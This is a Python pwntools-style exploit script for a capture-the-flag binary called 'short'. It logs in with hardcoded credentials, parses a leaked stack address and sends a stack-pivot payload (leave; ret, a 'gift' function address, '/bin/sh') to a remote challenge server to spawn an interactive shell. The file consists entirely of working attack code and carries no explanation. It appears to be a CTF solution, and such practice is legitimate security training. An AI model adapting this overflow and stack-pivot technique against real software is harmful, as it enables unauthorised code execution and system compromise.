#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from lianpwn import *
import sys

context.log_level = "debug"
context.arch = "i386"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 0
filename = "./short"
if LOCAL:
    io = process(filename)
else:
    remote_service = "0192d5cc24507df59a4363f904df9185.9os0.dg08.ciihw.cn:43190"
    remote_service = remote_service.strip().split(":")
    io = remote(remote_service[0], int(remote_service[1]))
elf = ELF(filename, checksec=False)
# libc = ELF(elf.libc.path, checksec=False)


def ru(a, drop=False):
    return io.recvuntil(a, drop)


rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

ru(b"Enter your username: ")
sl(b"admin\x00")
ru(b"Enter your password: ")
sl(b"admin123\x00")

debugPID(io)
ru(b"You will input this: 0x")
stack_leak = int(ru(b"\n", drop=True), 16)
lg("stack_leak", stack_leak)
ru(b"plz input your msg:\n")

gift_addr = 0x80485E6
leave_ret = 0x8048674

payload = flat(
    {
        0: b"/bin/sh\x00",
        0x14: [gift_addr, 0xDEADBEEF, stack_leak],
        # 0x50: [0xDEADBEEF, elf.plt.puts, stack_leak],
        0x50: [stack_leak + 0x10, leave_ret],
    }
)
s(payload)

ia()

"""
while True:
    try:

        ia()
    except:
        io.close()
        if LOCAL:
            io = process(filename)
        else:
            io = remote(remote_service[0], int(remote_service[1]))
"""
